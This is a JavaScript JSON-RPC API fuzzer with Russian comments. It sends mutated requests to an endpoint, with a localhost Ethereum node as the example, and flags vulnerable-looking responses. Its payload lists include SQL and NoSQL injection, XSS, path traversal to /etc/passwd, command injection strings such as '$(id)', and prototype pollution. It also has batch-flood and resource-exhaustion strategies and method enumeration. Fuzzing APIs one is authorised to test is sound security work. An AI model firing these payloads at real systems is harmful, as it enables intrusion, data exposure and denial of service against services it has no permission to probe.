
export class JRPCFuzzer {
    constructor(endpoint, options = {}) {
        this.endpoint = endpoint;
        this.useWebSocket = options.useWebSocket || false;
        this.headers = options.headers || {
            'Content-Type': 'application/json'
        };
        this.timeout = options.timeout || 5000;
        this.concurrency = options.concurrency || 3;
        this.results = [];
        this.methods = options.methods || [];
        this.ws = null;
        
        // Универсальные fuzzPatterns для любых API (REST, GraphQL, JSON-RPC, SOAP)

//(REST, GraphQL, JSON-RPC, SOAP)        
this.fuzzPatterns = {
    // Строковые инъекции - работают везде
    strings: [
        // Базовые
        '',
        'A'.repeat(10000),
        'A'.repeat(100 * 1024),
        '\x00\x01\x02\x03\x04\x05',
        
        // SQL инъекции (для бэкендов с SQL)
        'DROP TABLE users; --',                  
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR 1=1 --",
        
        // NoSQL инъекции (для MongoDB и др.)
        '{ "$ne": null }',
        '{ "$gt": "" }',
        '{ "$regex": ".*" }',
        '{ "$where": "return true" }',
        '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
        'username[$ne]=null',
        
        // XSS (для веб-интерфейсов)
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        
        // Path Traversal (для файловых операций)
        '../../../../etc/passwd',
        '..\\..\\..\\..\\windows\\win.ini',
        '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        
        // Template Injection (для шаблонизаторов)
        '${7*7}',
        '{{7*7}}',
        
        // Prototype Pollution (для JavaScript бэкендов)
        '{"__proto__": {"polluted": true}}',
        '__proto__.polluted=true',
        'constructor.prototype.polluted=true',
        
        // Command Injection (для системных вызовов)
        '; id',
        '| id',
        '`id`',
        '$(id)',
        'require("child_process").exec("id")',
        
        // GraphQL специфичные
        '{__typename}',
        '{__schema{types{name}}}',
        'query{__typename}',
        
        // JSON-RPC специфичные
        'admin_deleteAllUsers',
        'system_shutdown',
        
        // Универсальные опасные строки
        'null',
        'undefined',
        'NaN',
        'Infinity',
        '../../../../config/database.yml',
        'file:///etc/passwd',
        'C:\\Windows\\System32\\config\\sam',
        
        // Unicode атаки
        '😀'.repeat(1000),
        'नमस्ते'.repeat(100),
        '\u0000\u0001\u0002\u0003',
        '\u200B\u200C\u200D',  // Zero-width chars
        
        // Экранирование
        '%00', '%0a', '%0d', '%25', '%2e%2e%2f',
        '\\r\\n', '\\n', '\\t',
        
        // Логические операторы
        'true', 'false', 'null', 'undefined', 'NaN', 'Infinity', '-Infinity'
    ],
    
    // Числовые инъекции
    numbers: [
        0, -1, 1,
        2147483647,        // MAX INT32
        -2147483648,       // MIN INT32
        4294967295,        // MAX UINT32
        9223372036854775807,  // MAX INT64
        -9223372036854775808, // MIN INT64
        1.5, 2.7, 3.14,
        1e308, -1e308,
        1e-324,
        NaN, Infinity, -Infinity,
        '123', '0xFF', '0b1010', '0o777',
        'not_a_number',
        null,
        
        // NoSQL операторы
        { $gt: 0 },
        { $lt: 100 },
        { $ne: 0 },
        { $in: [1, 2, 3] }
    ],
    
    // Булевы инъекции
    booleans: [
        true, false, null, 1, 0, 'true', 'false', 'yes', 'no', '',
        { $ne: true },
        { $eq: false },
        { $exists: true }
    ],
    
    // Массивы
    arrays: [
        [],
        [null],
        [''],
        [1, 'two', true],
        Array(1000).fill('x'),
        [1, [2, [3, [4, [5]]]]],
        ['admin', { $ne: null }],
        [{ $gt: '' }, { $lt: '' }],
        [{ $regex: '.*' }]
    ],
    
    // Объекты
    objects: [
        {},
        { '__proto__': { 'polluted': true } },
        { 'constructor': { 'prototype': { 'polluted': true } } },
        
        // NoSQL операторы
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'function() { return true; }' },
        { $or: [{ username: 'admin' }, { password: { $ne: null } }] },
        { $and: [{ username: 'admin' }, { password: { $regex: '.*' } }] },
        
        // Вложенные
        { username: { $ne: null } },
        { password: { $regex: '.*' } },
        { 'user.profile.age': { $gt: 18 } },
        
        // Комбинированные
        { username: 'admin', password: { $ne: null } }
    ],
    
    // Null значения
    nullValues: [
        null, undefined,
        { $eq: null },
        { $ne: null },
        { $exists: false }
    ]
};

        this.mutationStrategies = {
            typeConfusion: this.typeConfusion.bind(this),
            boundaryValues: this.boundaryValues.bind(this),
            deepNesting: this.deepNesting.bind(this),
            unicodeInjection: this.unicodeInjection.bind(this),
            invalidId: this.invalidId.bind(this),
            malformedVersion: this.malformedVersion.bind(this),
            unknownMethod: this.unknownMethod.bind(this),
            missingFields: this.missingFields.bind(this),
            extraFields: this.extraFields.bind(this),
            batchAttack: this.batchAttack.bind(this),
            resourceExhaustion: this.resourceExhaustion.bind(this)
        };
    }

    // ========== СТРАТЕГИИ МУТАЦИИ ==========
    
    typeConfusion(params) {
        if (Array.isArray(params)) {
            return params.map(p => {
                if (typeof p === 'string') return Math.random() > 0.5 ? (parseInt(p) || 0) : { value: p };
                if (typeof p === 'number') return p.toString();
                if (typeof p === 'boolean') return p ? 'true' : 'false';
                if (p === null) return [];
                if (typeof p === 'object') return JSON.stringify(p);
                return p;
            });
        }
        return params;
    }

    boundaryValues(params) {
        const boundaries = ['', 0, -1, 2147483647, -2147483648, null, [], {}];
        if (Array.isArray(params)) {
            return params.map(() => boundaries[Math.floor(Math.random() * boundaries.length)]);
        }
        return boundaries[Math.floor(Math.random() * boundaries.length)];
    }

    deepNesting(params, depth = 10) {
        const createDeep = (d) => {
            if (d <= 0) return 'value';
            return { next: createDeep(d - 1) };
        };
        
        if (Array.isArray(params)) {
            return params.map(() => createDeep(depth));
        }
        return createDeep(depth);
    }

    unicodeInjection(params) {
        const unicodeChars = ['\u0000', '\u0001', '\u200B', '\u200C', '\u200D', '\uFEFF', '\u202E', '\u202D'];
        const inject = (val) => {
            if (typeof val === 'string') {
                const char = unicodeChars[Math.floor(Math.random() * unicodeChars.length)];
                return char + val + char;
            }
            return val;
        };
        
        if (Array.isArray(params)) {
            return params.map(inject);
        }
        return inject(params);
    }

    invalidId() {
        const invalidIds = [null, undefined, {}, [], '1.2.3', -1, 0, '', NaN, Infinity];
        return invalidIds[Math.floor(Math.random() * invalidIds.length)];
    }

    malformedVersion(request) {
        const versions = ['1.0', '2.1', '3.0', null, undefined, '', {}, [], 123, 'invalid'];
        request.jsonrpc = versions[Math.floor(Math.random() * versions.length)];
        return request;
    }

    unknownMethod(request) {
        const unknownMethods = [
            'unknown_method_' + Math.random().toString(36),
            'admin_deleteAll', 'system_shutdown', '__proto__', 'constructor',
            'then', 'toString', 'valueOf', 'prototype', '__defineGetter__'
        ];
        request.method = unknownMethods[Math.floor(Math.random() * unknownMethods.length)];
        return request;
    }

    missingFields(request) {
        const fields = ['jsonrpc', 'method', 'params', 'id'];
        const fieldToRemove = fields[Math.floor(Math.random() * fields.length)];
        const newRequest = { ...request };
        delete newRequest[fieldToRemove];
        return newRequest;
    }

    extraFields(request) {
        const newRequest = { ...request };
        newRequest.extra_field = Math.random().toString(36);
        return newRequest;
    }

    batchAttack(method, iterations = 100) {
        const batch = [];
        for (let i = 0; i < iterations; i++) {
            batch.push({
                jsonrpc: '2.0',
                method: method,
                params: this.generateParamsForMethod(method),
                id: i
            });
        }
        return batch;
    }

    resourceExhaustion(method) {
        const largeString = 'A'.repeat(10 * 1024 * 1024);
        const deepObject = this.deepNesting({}, 1000);
        
        return {
            jsonrpc: '2.0',
            method: method,
            params: [largeString, deepObject, Array(10000).fill('x')],
            id: 1
        };
    }

    // ========== ГЕНЕРАЦИЯ ПАРАМЕТРОВ ==========
    
    generateParamsForMethod(method) {
        if (method.includes('get') || method.includes('fetch')) {
            return [this.randomItem(this.fuzzPatterns.strings)];
        }
        if (method.includes('create') || method.includes('add')) {
            return [this.randomItem(this.fuzzPatterns.objects)];
        }
        if (method.includes('delete') || method.includes('remove')) {
            return [this.randomItem(this.fuzzPatterns.strings)];
        }
        if (method.includes('update')) {
            return [this.randomItem(this.fuzzPatterns.strings), this.randomItem(this.fuzzPatterns.objects)];
        }
        
        const numParams = Math.floor(Math.random() * 5);
        const params = [];
        const types = ['string', 'number', 'boolean', 'array', 'object', 'null'];
        for (let i = 0; i < numParams; i++) {
            const type = this.randomItem(types);
            params.push(this.generateValueByType(type));
        }
        return params;
    }

    generateValueByType(type) {
        switch(type) {
            case 'string': return this.randomItem(this.fuzzPatterns.strings);
            case 'number': return this.randomItem(this.fuzzPatterns.numbers);
            case 'boolean': return this.randomItem(this.fuzzPatterns.booleans);
            case 'array': return this.randomItem(this.fuzzPatterns.arrays);
            case 'object': return this.randomItem(this.fuzzPatterns.objects);
            case 'null': return this.randomItem(this.fuzzPatterns.nullValues);
            default: return null;
        }
    }

    randomItem(arr) {
        if (!arr || arr.length === 0) return null;
        return arr[Math.floor(Math.random() * arr.length)];
    }

    // ========== ОТПРАВКА ЗАПРОСОВ ==========
    
    async sendRequest(request) {
        const startTime = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), this.timeout);
        
        try {
            const response = await fetch(this.endpoint, {
                method: 'POST',
                headers: this.headers,
                body: JSON.stringify(request),
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            let data;
            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                data = await response.json();
            } else {
                data = await response.text();
            }
            
            return {
                status: response.status,
                request: request,
                response: data,
                responseTime: Date.now() - startTime,
                headers: Object.fromEntries(response.headers)
            };
        } catch (error) {
            clearTimeout(timeoutId);
            return {
                status: error.name === 'AbortError' ? 408 : 0,
                request: request,
                error: error.message,
                responseTime: Date.now() - startTime
            };
        }
    }

    async sendBatchRequest(batch) {
        const startTime = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), this.timeout);
        
        try {
            const response = await fetch(this.endpoint, {
                method: 'POST',
                headers: this.headers,
                body: JSON.stringify(batch),
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            let data;
            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                data = await response.json();
            } else {
                data = await response.text();
            }
            
            return {
                status: response.status,
                request: batch,
                response: data,
                responseTime: Date.now() - startTime,
                isBatch: true
            };
        } catch (error) {
            clearTimeout(timeoutId);
            return {
                status: error.name === 'AbortError' ? 408 : 0,
                request: batch,
                error: error.message,
                responseTime: Date.now() - startTime,
                isBatch: true
            };
        }
    }

    // ========== ДЕТЕКЦИЯ УЯЗВИМОСТЕЙ ==========
    
    detectVulnerabilities(response, request) {
        const vulnerabilities = [];
        const responseStr = JSON.stringify(response.response || response).toLowerCase();
        const errorStr = response.response?.error ? JSON.stringify(response.response.error).toLowerCase() : '';
        const fullResponse = responseStr + errorStr;
        
        if (/sql|mysql|postgres|ora-[0-9]|syntax error/.test(fullResponse)) {
            vulnerabilities.push({
                type: 'SQL_INJECTION',
                severity: 'CRITICAL',
                method: request.method,
                description: 'SQL ошибка раскрывает структуру БД',
                evidence: errorStr.substring(0, 200)
            });
        }
        
        if (/<script|javascript:|onerror=|onload=/.test(fullResponse)) {
            vulnerabilities.push({
                type: 'XSS',
                severity: 'HIGH',
                method: request.method,
                description: 'Возможна XSS атака через ответ сервера'
            });
        }
        
        if (/etc\/passwd|windows\\win\.ini|\.\.\/\.\.\//.test(fullResponse)) {
            vulnerabilities.push({
                type: 'PATH_TRAVERSAL',
                severity: 'HIGH',
                method: request.method,
                description: 'Path traversal атака успешна'
            });
        }
        
        if (response.response?.error && response.response.error.code === -32601) {
            vulnerabilities.push({
                type: 'METHOD_ENUMERATION',
                severity: 'LOW',
                method: request.method,
                description: 'Сервер раскрывает, что метод не существует (code -32601)'
            });
        }
        
        if (/stack trace|at [a-z]+ \(/i.test(fullResponse)) {
            vulnerabilities.push({
                type: 'STACK_TRACE_EXPOSURE',
                severity: 'HIGH',
                method: request.method,
                description: 'Стек трейд утек в ответ'
            });
        }
        
        if (response.responseTime > 5000) {
            vulnerabilities.push({
                type: 'SLOW_QUERY_DOS',
                severity: 'MEDIUM',
                method: request.method,
                description: `Запрос выполняется ${response.responseTime}ms`,
                responseTime: response.responseTime
            });
        }
        
        if (response.isBatch && response.responseTime > 10000) {
            vulnerabilities.push({
                type: 'BATCH_ATTACK_DOS',
                severity: 'HIGH',
                method: 'batch',
                description: `Batch запрос из ${request.length} операций вызвал задержку ${response.responseTime}ms`
            });
        }
        
        if (response.response?.error && response.response.error.data && typeof response.response.error.data === 'object') {
            vulnerabilities.push({
                type: 'INFO_DISCLOSURE',
                severity: 'MEDIUM',
                method: request.method,
                description: 'Сервер раскрывает дополнительную информацию в error.data'
            });
        }
        
        if (fullResponse.includes('__proto__') || fullResponse.includes('constructor')) {
            vulnerabilities.push({
                type: 'PROTOTYPE_POLLUTION',
                severity: 'HIGH',
                method: request.method,
                description: 'Возможна prototype pollution атака'
            });
        }
        
        if (fullResponse.includes('$ne') || fullResponse.includes('$gt') || fullResponse.includes('$regex') || fullResponse.includes('$where')) {
            vulnerabilities.push({
                type: 'NOSQL_INJECTION',
                severity: 'CRITICAL',
                method: request.method,
                description: 'NoSQL оператор найден в ответе - возможна инъекция'
            });
        }
        
        return vulnerabilities;
    }

    // ========== ФАЗЗИНГ МЕТОДА ==========
    
    async fuzzMethod(method, iterations = 30) {
        console.log(`\n🎯 Фаззинг метода: ${method}`);
        
        for (let i = 0; i < iterations; i++) {
            const strategyNames = Object.keys(this.mutationStrategies);
            const strategyName = this.randomItem(strategyNames);
            const strategy = this.mutationStrategies[strategyName];
            
            let request = {
                jsonrpc: '2.0',
                method: method,
                params: this.generateParamsForMethod(method),
                id: Math.floor(Math.random() * 1000000)
            };
            
            try {
                if (strategyName === 'invalidId') {
                    request.id = strategy();
                } else if (strategyName === 'malformedVersion') {
                    request = strategy(request);
                } else if (strategyName === 'unknownMethod') {
                    request = strategy(request);
                } else if (strategyName === 'missingFields') {
                    request = strategy(request);
                } else if (strategyName === 'extraFields') {
                    request = strategy(request);
                } else if (strategyName === 'batchAttack') {
                    const batch = strategy(method, 50);
                    const result = await this.sendBatchRequest(batch);
                    const vulns = this.detectVulnerabilities(result, batch);
                    if (vulns.length) {
                        this.results.push(...vulns);
                        for (const v of vulns) {
                            console.log(`   🔴 [${v.severity}] ${v.type}: ${v.description}`);
                        }
                    }
                    continue;
                } else if (strategyName === 'resourceExhaustion') {
                    request = strategy(method);
                } else if (strategyName === 'typeConfusion') {
                    request.params = strategy(request.params);
                } else if (strategyName === 'boundaryValues') {
                    request.params = strategy(request.params);
                } else if (strategyName === 'deepNesting') {
                    request.params = strategy(request.params);
                } else if (strategyName === 'unicodeInjection') {
                    request.params = strategy(request.params);
                }
                
                const result = await this.sendRequest(request);
                const vulns = this.detectVulnerabilities(result, request);
                
                if (vulns.length) {
                    this.results.push(...vulns);
                    for (const v of vulns) {
                        console.log(`   🔴 [${v.severity}] ${v.type}: ${v.description}`);
                    }
                } else if (result.status !== 200) {
                    console.log(`   ⚠️ Ошибка: HTTP ${result.status} - ${result.error?.substring(0, 100) || ''}`);
                } else if (result.response?.error) {
                    const code = result.response.error.code;
                    if (code !== -32601 && code !== -32602) {
                        console.log(`   ⚠️ RPC ошибка: code ${code} - ${result.response.error.message?.substring(0, 100)}`);
                    }
                }
            } catch (error) {
                console.log(`   ✗ Ошибка: ${error.message}`);
            }
            
            await new Promise(r => setTimeout(r, 100));
        }
    }

    // ========== ОСНОВНОЙ ЗАПУСК ==========
    
    async run() {
        console.log('\n🔍 НАЧАЛО ФАЗЗИНГА JSON-RPC API');
        console.log(`📍 Endpoint: ${this.endpoint}`);
        console.log(`📋 Методов для тестирования: ${this.methods.length || 'авто-обнаружение'}\n`);
        
        let methodsToFuzz = this.methods;
        
        if (methodsToFuzz.length === 0) {
            console.log('🔎 Авто-обнаружение методов через энумерацию...');
            methodsToFuzz = await this.discoverMethods();
            console.log(`✅ Обнаружено методов: ${methodsToFuzz.length}`);
        }
        
        for (const method of methodsToFuzz) {
            await this.fuzzMethod(method, 25);
        }
        
        console.log('\n🚀 ЗАПУСК СПЕЦИАЛЬНЫХ ТЕСТОВ\n');
        
        console.log('🎯 Batch атака (100 операций)...');
        const batchResult = await this.sendBatchRequest(this.mutationStrategies.batchAttack('test', 100));
        const batchVulns = this.detectVulnerabilities(batchResult, { method: 'batch', length: 100 });
        this.results.push(...batchVulns);
        
        console.log('🎯 Resource Exhaustion (большой payload)...');
        const exhaustionRequest = this.mutationStrategies.resourceExhaustion('test');
        const exhaustionResult = await this.sendRequest(exhaustionRequest);
        const exhaustionVulns = this.detectVulnerabilities(exhaustionResult, exhaustionRequest);
        this.results.push(...exhaustionVulns);
        
        this.printReport();
        
        return this.results;
    }
    
    async discoverMethods() {
        const commonMethods = [
            'get_info', 'get_version', 'get_status', 'ping', 'echo',
            'get_balance', 'get_account', 'get_user', 'get_data',
            'list_methods', 'rpc_methods', 'system_listMethods',
            'get_health', 'health_check', 'ready',
            'get_block', 'get_transaction', 'get_blocks',
            'eth_blockNumber', 'eth_getBalance', 'net_version',
            'getblockchaininfo', 'getnetworkinfo', 'getwalletinfo'
        ];
        
        const discovered = [];
        
        for (const method of commonMethods) {
            const request = {
                jsonrpc: '2.0',
                method: method,
                params: [],
                id: 1
            };
            
            const result = await this.sendRequest(request);
            if (!result.response?.error || result.response.error.code !== -32601) {
                discovered.push(method);
                console.log(`   ✓ Найден метод: ${method}`);
            }
            
            await new Promise(r => setTimeout(r, 50));
        }
        
        return discovered;
    }

    printReport() {
        console.log('\n' + '='.repeat(70));
        console.log('📊 ОТЧЕТ О ФАЗЗИНГЕ JSON-RPC');
        console.log('='.repeat(70));
        
        const critical = this.results.filter(r => r.severity === 'CRITICAL');
        const high = this.results.filter(r => r.severity === 'HIGH');
        const medium = this.results.filter(r => r.severity === 'MEDIUM');
        const low = this.results.filter(r => r.severity === 'LOW');
        
        console.log(`\n🔴 CRITICAL: ${critical.length}`);
        console.log(`🟠 HIGH: ${high.length}`);
        console.log(`🟡 MEDIUM: ${medium.length}`);
        console.log(`🟢 LOW: ${low.length}`);
        
        if (this.results.length > 0) {
            console.log('\n📋 ДЕТАЛИ УЯЗВИМОСТЕЙ:');
            
            const allVulns = [...critical, ...high, ...medium, ...low];
            allVulns.forEach((v, i) => {
                console.log(`\n${i + 1}. [${v.severity}] ${v.type}`);
                console.log(`   Метод: ${v.method}`);
                console.log(`   Описание: ${v.description}`);
                if (v.evidence) console.log(`   Данные: ${v.evidence.substring(0, 200)}`);
                if (v.responseTime) console.log(`   Время ответа: ${v.responseTime}ms`);
            });
        } else {
            console.log('\n✅ Уязвимостей не обнаружено');
        }
        
        console.log('\n' + '='.repeat(70));
    }

    exportResults(format = 'json') {
        const report = {
            target: this.endpoint,
            timestamp: new Date().toISOString(),
            totalVulnerabilities: this.results.length,
            vulnerabilities: this.results,
            summary: {
                critical: this.results.filter(r => r.severity === 'CRITICAL').length,
                high: this.results.filter(r => r.severity === 'HIGH').length,
                medium: this.results.filter(r => r.severity === 'MEDIUM').length,
                low: this.results.filter(r => r.severity === 'LOW').length
            }
        };
        
        if (format === 'json') {
            return JSON.stringify(report, null, 2);
        } else if (format === 'csv') {
            const headers = ['type', 'severity', 'method', 'description', 'timestamp'];
            const rows = this.results.map(r => 
                [r.type, r.severity, r.method, r.description || '', r.timestamp || new Date().toISOString()].map(cell => `"${cell}"`).join(',')
            );
            return [headers.join(','), ...rows].join('\n');
        }
        
        return report;
    }
}

// ========== ПРИМЕР ИСПОЛЬЗОВАНИЯ ==========
export async function main() {
    const fuzzer = new JRPCFuzzer('http://localhost:8545', {
        headers: {
            'Content-Type': 'application/json'
        },
        timeout: 10000,
        methods: [
            'eth_getBalance',
            'eth_blockNumber',
            'eth_getTransactionCount',
            'net_version',
            'web3_clientVersion'
        ]
    });
    
    const results = await fuzzer.run();
    
    console.log('\n💾 Результаты фаззинга:');
    console.log(JSON.stringify(results, null, 2));
}

// Запуск (раскомментировать для использования)
// main();
/*
import { JRPCFuzzer } from './jrpc-fuzzer.js';

const fuzzer = new JRPCFuzzer('http://localhost:8545', {
    headers: { 'Content-Type': 'application/json' },
    timeout: 10000,
    methods: ['eth_getBalance', 'eth_blockNumber']
});

await fuzzer.run();
*/